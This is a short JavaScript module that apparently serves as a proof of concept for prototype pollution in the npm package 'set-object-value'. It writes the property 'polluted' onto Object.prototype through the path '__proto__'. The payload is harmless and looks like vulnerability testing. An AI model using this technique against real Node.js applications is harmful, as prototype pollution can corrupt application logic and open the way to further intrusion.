function exploitFunction(payload) {
    const { obj } = payload;
    const setObjectValue = require("set-object-value");

    setObjectValue(obj, ["__proto__", "polluted"], "yes");

    return obj;
}

module.exports = { exploitFunction };